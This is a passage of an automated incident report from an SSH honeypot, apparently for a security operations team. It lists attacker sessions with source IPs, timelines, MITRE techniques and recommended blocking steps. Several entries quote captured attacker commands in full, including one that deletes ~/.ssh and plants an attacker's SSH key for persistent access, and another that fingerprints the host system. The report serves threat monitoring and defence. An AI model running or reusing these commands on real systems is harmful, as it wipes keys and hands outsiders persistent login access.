| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:00:16` | `cowrie.session.connect` |
| `2026-07-05 04:00:16` | `cowrie.client.version` |
| `2026-07-05 04:00:16` | `cowrie.client.kex` |
| `2026-07-05 04:00:17` | `cowrie.login.success` |
| `2026-07-05 04:00:18` | `cowrie.session.params` |
| `2026-07-05 04:00:18` | `cowrie.command.input` |
| `2026-07-05 04:00:18` | `cowrie.command.failed` |
| `2026-07-05 04:00:18` | `cowrie.log.closed` |
| `2026-07-05 04:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]71` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24bb964b9b3f

| Field | Detail |
|---|---|
| **Source IP** | `175.45.204[.]121` |
| **First Seen** | 2026-07-05 04:00 |
| **Last Seen** | 2026-07-05 04:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:00:42` | `cowrie.session.connect` |
| `2026-07-05 04:00:42` | `cowrie.client.version` |
| `2026-07-05 04:00:43` | `cowrie.client.kex` |
| `2026-07-05 04:00:43` | `cowrie.login.success` |
| `2026-07-05 04:00:44` | `cowrie.session.params` |
| `2026-07-05 04:00:44` | `cowrie.command.input` |
| `2026-07-05 04:00:44` | `cowrie.command.failed` |
| `2026-07-05 04:00:45` | `cowrie.log.closed` |
| `2026-07-05 04:00:46` | `cowrie.session.params` |
| `2026-07-05 04:00:46` | `cowrie.command.input` |
| `2026-07-05 04:00:46` | `cowrie.session.file_download` |
| `2026-07-05 04:00:46` | `cowrie.log.closed` |
| `2026-07-05 04:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.45.204[.]121` to AbuseIPDB if not already reported
- [ ] Block `175.45.204[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da54e6602017

| Field | Detail |
|---|---|
| **Source IP** | `175.45.204[.]121` |
| **First Seen** | 2026-07-05 04:00 |
| **Last Seen** | 2026-07-05 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:00:46` | `cowrie.session.connect` |
| `2026-07-05 04:00:46` | `cowrie.client.version` |
| `2026-07-05 04:00:46` | `cowrie.client.kex` |
| `2026-07-05 04:00:47` | `cowrie.login.success` |
| `2026-07-05 04:00:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.45.204[.]121` to AbuseIPDB if not already reported
- [ ] Block `175.45.204[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c374f8f8326

| Field | Detail |
|---|---|
| **Source IP** | `175.45.204[.]121` |
| **First Seen** | 2026-07-05 04:00 |
| **Last Seen** | 2026-07-05 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:00:47` | `cowrie.session.connect` |
| `2026-07-05 04:00:47` | `cowrie.client.version` |
| `2026-07-05 04:00:48` | `cowrie.client.kex` |
| `2026-07-05 04:00:48` | `cowrie.login.success` |
| `2026-07-05 04:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.45.204[.]121` to AbuseIPDB if not already reported
- [ ] Block `175.45.204[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36716986c792

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:00 |
| **Last Seen** | 2026-07-05 04:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:00:56` | `cowrie.session.connect` |
| `2026-07-05 04:00:57` | `cowrie.client.version` |
| `2026-07-05 04:00:57` | `cowrie.client.kex` |
| `2026-07-05 04:01:00` | `cowrie.login.success` |
| `2026-07-05 04:01:02` | `cowrie.session.params` |
| `2026-07-05 04:01:02` | `cowrie.command.input` |
| `2026-07-05 04:01:02` | `cowrie.command.input` |
| `2026-07-05 04:01:02` | `cowrie.command.input` |
| `2026-07-05 04:01:02` | `cowrie.command.input` |
| `2026-07-05 04:01:02` | `cowrie.command.input` |
| `2026-07-05 04:01:02` | `cowrie.command.success` |
| `2026-07-05 04:01:02` | `cowrie.command.input` |
| `2026-07-05 04:01:02` | `cowrie.command.input` |
| `2026-07-05 04:01:02` | `cowrie.command.input` |
| `2026-07-05 04:01:02` | `cowrie.command.input` |
| `2026-07-05 04:01:03` | `cowrie.log.closed` |
| `2026-07-05 04:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcdd5e95bdd0

| Field | Detail |
|---|---|
| **Source IP** | `42.240.164[.]208` |
| **First Seen** | 2026-07-05 04:01 |
| **Last Seen** | 2026-07-05 04:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:01:10` | `cowrie.session.connect` |
| `2026-07-05 04:01:10` | `cowrie.client.version` |
| `2026-07-05 04:01:10` | `cowrie.client.kex` |
| `2026-07-05 04:01:11` | `cowrie.login.success` |
| `2026-07-05 04:01:12` | `cowrie.session.params` |
| `2026-07-05 04:01:12` | `cowrie.command.input` |
| `2026-07-05 04:01:12` | `cowrie.command.failed` |
| `2026-07-05 04:01:13` | `cowrie.log.closed` |
| `2026-07-05 04:01:13` | `cowrie.session.params` |
| `2026-07-05 04:01:13` | `cowrie.command.input` |
| `2026-07-05 04:01:14` | `cowrie.session.file_download` |
| `2026-07-05 04:01:14` | `cowrie.log.closed` |
| `2026-07-05 04:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.240.164[.]208` to AbuseIPDB if not already reported
- [ ] Block `42.240.164[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-590907ac764b

| Field | Detail |
|---|---|
| **Source IP** | `42.240.164[.]208` |
| **First Seen** | 2026-07-05 04:01 |
| **Last Seen** | 2026-07-05 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:01:14` | `cowrie.session.connect` |
| `2026-07-05 04:01:14` | `cowrie.client.version` |
| `2026-07-05 04:01:14` | `cowrie.client.kex` |
| `2026-07-05 04:01:15` | `cowrie.login.success` |
| `2026-07-05 04:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.240.164[.]208` to AbuseIPDB if not already reported
- [ ] Block `42.240.164[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92638a9c3582

| Field | Detail |
|---|---|
| **Source IP** | `42.240.164[.]208` |
| **First Seen** | 2026-07-05 04:01 |
| **Last Seen** | 2026-07-05 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:01:15` | `cowrie.session.connect` |
| `2026-07-05 04:01:15` | `cowrie.client.version` |
| `2026-07-05 04:01:16` | `cowrie.client.kex` |
| `2026-07-05 04:01:17` | `cowrie.login.success` |
| `2026-07-05 04:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.240.164[.]208` to AbuseIPDB if not already reported
- [ ] Block `42.240.164[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b963d428991

| Field | Detail |
|---|---|
| **Source IP** | `152.32.239[.]122` |
| **First Seen** | 2026-07-05 04:01 |
| **Last Seen** | 2026-07-05 04:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:01:20` | `cowrie.session.connect` |
| `2026-07-05 04:01:20` | `cowrie.client.version` |
| `2026-07-05 04:01:20` | `cowrie.client.kex` |
| `2026-07-05 04:01:21` | `cowrie.login.success` |
| `2026-07-05 04:01:22` | `cowrie.session.params` |
| `2026-07-05 04:01:22` | `cowrie.command.input` |
| `2026-07-05 04:01:22` | `cowrie.command.failed` |
| `2026-07-05 04:01:23` | `cowrie.log.closed` |
| `2026-07-05 04:01:24` | `cowrie.session.params` |
| `2026-07-05 04:01:24` | `cowrie.command.input` |
| `2026-07-05 04:01:24` | `cowrie.session.file_download` |
| `2026-07-05 04:01:24` | `cowrie.log.closed` |
| `2026-07-05 04:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.239[.]122` to AbuseIPDB if not already reported
- [ ] Block `152.32.239[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f26ecf5e0ee9

| Field | Detail |
|---|---|
| **Source IP** | `152.32.239[.]122` |
| **First Seen** | 2026-07-05 04:01 |
| **Last Seen** | 2026-07-05 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:01:24` | `cowrie.session.connect` |
| `2026-07-05 04:01:24` | `cowrie.client.version` |
| `2026-07-05 04:01:25` | `cowrie.client.kex` |
| `2026-07-05 04:01:25` | `cowrie.login.success` |
| `2026-07-05 04:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.239[.]122` to AbuseIPDB if not already reported
- [ ] Block `152.32.239[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10acd2956c7b

| Field | Detail |
|---|---|
| **Source IP** | `152.32.239[.]122` |
| **First Seen** | 2026-07-05 04:01 |
| **Last Seen** | 2026-07-05 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:01:26` | `cowrie.session.connect` |
| `2026-07-05 04:01:26` | `cowrie.client.version` |
| `2026-07-05 04:01:26` | `cowrie.client.kex` |
| `2026-07-05 04:01:27` | `cowrie.login.success` |
| `2026-07-05 04:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.239[.]122` to AbuseIPDB if not already reported
- [ ] Block `152.32.239[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf70b28c5e2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:02 |
| **Last Seen** | 2026-07-05 04:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:02:22` | `cowrie.session.connect` |
| `2026-07-05 04:02:23` | `cowrie.client.version` |
| `2026-07-05 04:02:24` | `cowrie.client.kex` |
| `2026-07-05 04:02:26` | `cowrie.login.success` |
| `2026-07-05 04:02:27` | `cowrie.session.params` |
| `2026-07-05 04:02:27` | `cowrie.command.input` |
| `2026-07-05 04:02:27` | `cowrie.command.input` |
| `2026-07-05 04:02:27` | `cowrie.command.input` |
| `2026-07-05 04:02:27` | `cowrie.command.input` |
| `2026-07-05 04:02:27` | `cowrie.command.input` |
| `2026-07-05 04:02:27` | `cowrie.command.success` |
| `2026-07-05 04:02:27` | `cowrie.command.input` |
| `2026-07-05 04:02:27` | `cowrie.command.input` |
| `2026-07-05 04:02:27` | `cowrie.command.input` |
| `2026-07-05 04:02:27` | `cowrie.command.input` |
| `2026-07-05 04:02:28` | `cowrie.log.closed` |
| `2026-07-05 04:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0e8e36044c1

| Field | Detail |
|---|---|
| **Source IP** | `175.103.54[.]172` |
| **First Seen** | 2026-07-05 04:02 |
| **Last Seen** | 2026-07-05 04:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:02:31` | `cowrie.session.connect` |
| `2026-07-05 04:02:31` | `cowrie.client.version` |
| `2026-07-05 04:02:31` | `cowrie.client.kex` |
| `2026-07-05 04:02:32` | `cowrie.login.success` |
| `2026-07-05 04:02:33` | `cowrie.session.params` |
| `2026-07-05 04:02:33` | `cowrie.command.input` |
| `2026-07-05 04:02:33` | `cowrie.command.failed` |
| `2026-07-05 04:02:34` | `cowrie.log.closed` |
| `2026-07-05 04:02:35` | `cowrie.session.params` |
| `2026-07-05 04:02:35` | `cowrie.command.input` |
| `2026-07-05 04:02:35` | `cowrie.session.file_download` |
| `2026-07-05 04:02:35` | `cowrie.log.closed` |
| `2026-07-05 04:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.103.54[.]172` to AbuseIPDB if not already reported
- [ ] Block `175.103.54[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32c0c0bd9368

| Field | Detail |
|---|---|
| **Source IP** | `175.103.54[.]172` |
| **First Seen** | 2026-07-05 04:02 |
| **Last Seen** | 2026-07-05 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:02:36` | `cowrie.session.connect` |
| `2026-07-05 04:02:36` | `cowrie.client.version` |
| `2026-07-05 04:02:36` | `cowrie.client.kex` |
| `2026-07-05 04:02:37` | `cowrie.login.success` |
| `2026-07-05 04:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.103.54[.]172` to AbuseIPDB if not already reported
- [ ] Block `175.103.54[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c2afb6e92eb

| Field | Detail |
|---|---|
| **Source IP** | `175.103.54[.]172` |
| **First Seen** | 2026-07-05 04:02 |
| **Last Seen** | 2026-07-05 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:02:37` | `cowrie.session.connect` |
| `2026-07-05 04:02:37` | `cowrie.client.version` |
| `2026-07-05 04:02:38` | `cowrie.client.kex` |
| `2026-07-05 04:02:39` | `cowrie.login.success` |
| `2026-07-05 04:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.103.54[.]172` to AbuseIPDB if not already reported
- [ ] Block `175.103.54[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2aae085fae5

| Field | Detail |
|---|---|
| **Source IP** | `62.133.169[.]58` |
| **First Seen** | 2026-07-05 04:03 |
| **Last Seen** | 2026-07-05 04:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:03:38` | `cowrie.session.connect` |
| `2026-07-05 04:03:38` | `cowrie.client.version` |
| `2026-07-05 04:03:38` | `cowrie.client.kex` |
| `2026-07-05 04:03:39` | `cowrie.login.success` |
| `2026-07-05 04:03:40` | `cowrie.session.params` |
| `2026-07-05 04:03:40` | `cowrie.command.input` |
| `2026-07-05 04:03:40` | `cowrie.command.failed` |
| `2026-07-05 04:03:40` | `cowrie.log.closed` |
| `2026-07-05 04:03:41` | `cowrie.session.params` |
| `2026-07-05 04:03:41` | `cowrie.command.input` |
| `2026-07-05 04:03:41` | `cowrie.session.file_download` |
| `2026-07-05 04:03:41` | `cowrie.log.closed` |
| `2026-07-05 04:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.133.169[.]58` to AbuseIPDB if not already reported
- [ ] Block `62.133.169[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca26381ca62e

| Field | Detail |
|---|---|
| **Source IP** | `62.133.169[.]58` |
| **First Seen** | 2026-07-05 04:03 |
| **Last Seen** | 2026-07-05 04:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:03:41` | `cowrie.session.connect` |
| `2026-07-05 04:03:41` | `cowrie.client.version` |
| `2026-07-05 04:03:41` | `cowrie.client.kex` |
| `2026-07-05 04:03:42` | `cowrie.login.success` |
| `2026-07-05 04:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.133.169[.]58` to AbuseIPDB if not already reported
- [ ] Block `62.133.169[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-910e2172f730

| Field | Detail |
|---|---|
| **Source IP** | `62.133.169[.]58` |
| **First Seen** | 2026-07-05 04:03 |
| **Last Seen** | 2026-07-05 04:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:03:42` | `cowrie.session.connect` |
| `2026-07-05 04:03:42` | `cowrie.client.version` |
| `2026-07-05 04:03:42` | `cowrie.client.kex` |
| `2026-07-05 04:03:43` | `cowrie.login.success` |
| `2026-07-05 04:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.133.169[.]58` to AbuseIPDB if not already reported
- [ ] Block `62.133.169[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0459ce3fca0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:03 |
| **Last Seen** | 2026-07-05 04:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:03:51` | `cowrie.session.connect` |
| `2026-07-05 04:03:52` | `cowrie.client.version` |
| `2026-07-05 04:03:52` | `cowrie.client.kex` |
| `2026-07-05 04:03:55` | `cowrie.login.success` |
| `2026-07-05 04:03:56` | `cowrie.session.params` |
| `2026-07-05 04:03:56` | `cowrie.command.input` |
| `2026-07-05 04:03:56` | `cowrie.command.input` |
| `2026-07-05 04:03:56` | `cowrie.command.input` |
| `2026-07-05 04:03:56` | `cowrie.command.input` |
